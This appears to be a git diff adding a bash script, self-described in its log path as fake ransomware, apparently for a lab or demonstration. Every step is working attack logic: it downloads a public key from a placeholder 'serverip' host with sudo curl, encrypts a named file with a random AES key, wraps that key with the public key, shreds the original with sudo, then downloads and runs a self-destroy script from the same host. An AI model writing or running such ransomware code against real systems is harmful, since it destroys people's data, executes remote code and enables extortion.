@@ -1,0 +1,68 @@
+#!/bin/bash
+
+#set up a log file
+logfile="/home/web/fake_ransomware.log"
+log() {
+	level=$1
+	shift 
+	user=$USER
+	echo "$(date -Iseconds) [$level] [user:$user] $*" >> "$logfile"
+}
+
+log INFO "Script started"
+log INFO "Downloading file"
+
+#get the public key to encrypt
+if sudo curl --remote-name serverip/downloads/ublic; then
+	log INFO "Download successful"
+else
+	log ERROR "Download failed"
+fi 
+
+#find the downloaded public key
+key=$(find ~/ -name "ublic")
+
+#generate a random AES key
+aes_key=$(openssl rand -hex 32)
+
+#specify the target file to encrypt
+target=$(find ~/ -name "Get_Crypt.txt")
+
+#start encrypting
+log INFO "Start encrypting"
+
+#check if the target is a file and then encrypt it with the generated password
+if [ -f "$target" ]; then
+        openssl enc -aes-256-cbc -salt -pbkdf2 \
+        -in "$target" \
+        -out "$target.enc" \
+        -pass pass:"$aes_key"
+
+#now encrypt the AES key with the public key
+echo  "$aes_key" | openssl pkeyutl -encrypt \
+	-pubin \
+	-inkey $key\
+	-out "closed.key" 
+log INFO "Data encrypted"
+
+#after encryption, delete the original file so a user without the password cannot access it
+sudo chmod +rwx $target
+sudo shred -u "$target"
+else 
+	log INFO "Encryption failed"
+fi
+
+#download the self-destroy script
+log INFO "Downloading self-destroy script"
+if sudo curl --remote-name serverip/downloads/self_destroy.sh; then
+	log INFO "Download successful" 
+else
+	log INFO "Download failed"
+fi
+
+#find and execute the self-destroy script
+self=$(find ~/ -name "self_destroy.sh")
+sudo chmod +rwx $self
+./self_destroy.sh
+
+log INFO "Script ends"
